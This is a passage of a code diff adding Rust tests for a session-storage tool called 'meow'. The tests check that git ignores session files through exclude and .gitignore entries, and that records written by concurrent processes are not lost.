+        let fx = fixture();
+        let (ws, _) = open(&fx, "acme", true);
+        let mark = ws.profile.id.clone().unwrap();
+        create_private_dir(&fx.home.root().join(SEEN_DIR)).unwrap();
+        fs::write(seen_path(&fx.home, &mark), "something else\n").unwrap();
+        assert!(ws.files_changed(&fx.home));
+    }
+
+    /// Git keeps out of `./meow`: it is listed in `.git/info/exclude`, and
+    /// the `.gitignore` in it and in each session keep session files out
+    /// even when a pull lets `./meow` in. A running session puts those
+    /// back, and says when git tracks a session file.
+    #[test]
+    fn meow_is_kept_out_of_the_git_repository_it_is_in() {
+        let fx = fixture();
+        let repo = other_folder(&fx, "repo");
+        let git = |dir: &Path, args: &[&str]| {
+            std::process::Command::new("git")
+                .arg("-C")
+                .arg(dir)
+                .args(args)
+                .env("GIT_CONFIG_NOSYSTEM", "1")
+                .env(
+                    "GIT_CONFIG_GLOBAL",
+                    if cfg!(windows) { "NUL" } else { "/dev/null" },
+                )
+                .output()
+                .ok()
+                .filter(|out| out.status.success())
+                .map(|out| String::from_utf8_lossy(&out.stdout).into_owned())
+        };
+        let with_git = git(&repo, &["init", "-q"]).is_some();
+        if !with_git {
+            fs::create_dir(repo.join(".git")).unwrap();
+        }
+        let deeper = repo.join("a [b]*").join("c");
+        fs::create_dir_all(&deeper).unwrap();
+        let acme = open_in(&fx, &repo, "acme");
+        open_in(&fx, &deeper, "beta");
+        open_in(&fx, &repo, "gamma");
+        assert!(is_sessions_marker(&acme.dir.join(".gitignore")));
+        let exclude = fs::read_to_string(repo.join(".git").join("info").join("exclude")).unwrap();
+        let lines: Vec<&str> = exclude
+            .lines()
+            .filter(|line| !line.starts_with('#') && !line.is_empty())
+            .collect();
+        assert_eq!(lines, ["/meow/", "/a \\[b\\]\\*/c/meow/"], "{exclude}");
+        fs::write(acme.dir.join("chats").join("192.0.2.5.md"), "x").unwrap();
+        if with_git {
+            // A pull that replaced meow's .gitignore with one letting
+            // everything in, and let ./meow in at the top (which beats
+            // .git/info/exclude): the sessions' own .gitignore keep them out.
+            fs::write(repo.join(".gitignore"), "!/meow/\n").unwrap();
+            fs::write(repo.join("meow").join(".gitignore"), "!*\n").unwrap();
+            fs::write(deeper.join("meow").join(".gitignore"), "!*\n").unwrap();
+            let seen = git(&repo, &["status", "--porcelain", "--untracked-files=all"]).unwrap();
+            assert!(!seen.contains("meow/acme"), "{seen}");
+            assert!(!seen.contains("meow/beta"), "{seen}");
+            // Without the session's own, git would take its files in.
+            fs::remove_file(acme.dir.join(".gitignore")).unwrap();
+            let seen = git(&repo, &["status", "--porcelain", "--untracked-files=all"]).unwrap();
+            assert!(seen.contains("meow/acme/chats/192.0.2.5.md"), "{seen}");
+        }
+        // A running session puts both back, and says so.
+        fs::write(repo.join("meow").join(".gitignore"), "!*\n").unwrap();
+        fs::write(acme.dir.join(".gitignore"), "!*\n").unwrap();
+        let mut watch = GitWatch::default();
+        let notes = watch.check(&acme.dir);
+        for said in ["meow/.gitignore had been", "meow/acme/.gitignore had been"] {
+            assert!(notes.iter().any(|note| note.starts_with(said)), "{notes:?}");
+        }
+        assert!(is_sessions_marker(&repo.join("meow").join(".gitignore")));
+        assert!(is_sessions_marker(&acme.dir.join(".gitignore")));
+        assert_eq!(watch.check(&acme.dir), Vec::<String>::new());
+        if with_git {
+            // A pull that makes git track a session file: said once.
+            git(&repo, &["add", "-f", "meow/acme/chats/192.0.2.5.md"]).unwrap();
+            let notes = watch.check(&acme.dir);
+            assert!(
+                notes.iter().any(|note| note
+                    .starts_with("git tracks session files (meow/acme/chats/192.0.2.5.md)")),
+                "{notes:?}"
+            );
+            assert!(notes.iter().all(|note| !note.contains("does not ignore")));
+            fs::write(repo.join("README"), "x").unwrap();
+            git(&repo, &["add", "README"]).unwrap();
+            assert_eq!(watch.check(&acme.dir), Vec::<String>::new());
+            // What meow cannot put back (a folder in place of each
+            // .gitignore), and git then takes in.
+            git(
+                &repo,
+                &["rm", "-q", "--cached", "meow/acme/chats/192.0.2.5.md"],
+            )
+            .unwrap();
+            let markers = [
+                repo.join("meow").join(".gitignore"),
+                acme.dir.join(".gitignore"),
+            ];
+            for marker in &markers {
+                fs::remove_file(marker).unwrap();
+                fs::create_dir(marker).unwrap();
+            }
+            let notes = watch.check(&acme.dir);
+            assert!(
+                notes
+                    .iter()
+                    .any(|note| note.starts_with("git does not ignore session files (meow/")),
+                "{notes:?}"
+            );
+            for marker in &markers {
+                fs::remove_dir(marker).unwrap();
+            }
+            assert!(watch.check(&acme.dir).len() == 2);
+        }
+        let again = fs::read_to_string(repo.join(".git").join("info").join("exclude")).unwrap();
+        assert_eq!(again, exclude, "listed once");
+
+        // A `.git` that is a file (a linked work tree) is left alone.
+        let linked = other_folder(&fx, "linked");
+        fs::write(linked.join(".git"), "gitdir: /elsewhere\n").unwrap();
+        open_in(&fx, &linked, "delta");
+        assert!(linked.join(".git").is_file());
+        // A folder in no repository: nothing is written above it.
+        assert_eq!(exclude_pattern(Path::new("")), Some("/meow/".to_owned()));
+        assert_eq!(exclude_pattern(Path::new("x\ny")), None);
+    }
+
+    /// Two meow processes started together (two terminals, a script) each
+    /// record their new session: neither entry may be lost.
+    #[test]
+    fn sessions_recorded_at_the_same_time_are_all_kept() {
+        let fx = fixture();
+        create_private_dir(fx.home.root()).unwrap();
+        let made: Vec<String> = (0..24).map(|i| format!("{i:032x}")).collect();
+        std::thread::scope(|scope| {
+            for (i, mark) in made.iter().enumerate() {
+                let home = &fx.home;
+                let dir = fx.cwd.join(format!("p{i}")).join("meow").join("s");
+                scope.spawn(move || remember(home, mark, Some(&dir)).unwrap());
+            }
+        });
+        let mut kept = marks(&fx.home);
+        kept.sort();
+        assert_eq!(kept, made);
+        // And a delete running alongside new ones takes only its own.
+        let gone = fx.cwd.join("p3").join("meow").join("s");
+        let more: Vec<String> = (100..112).map(|i| format!("{i:032x}")).collect();
+        std::thread::scope(|scope| {
+            scope.spawn(|| forget(&fx.home, &gone, Some(&made[3])).unwrap());
+            for (i, mark) in more.iter().enumerate() {
+                let home = &fx.home;
+                let dir = fx.cwd.join(format!("q{i}")).join("meow").join("s");
+                scope.spawn(move || remember(home, mark, Some(&dir)).unwrap());
+            }
+        });
+        let kept = marks(&fx.home);
+        assert_eq!(kept.len(), made.len() - 1 + more.len());
+        assert!(!kept.contains(&made[3]));
     }
 
     #[test]
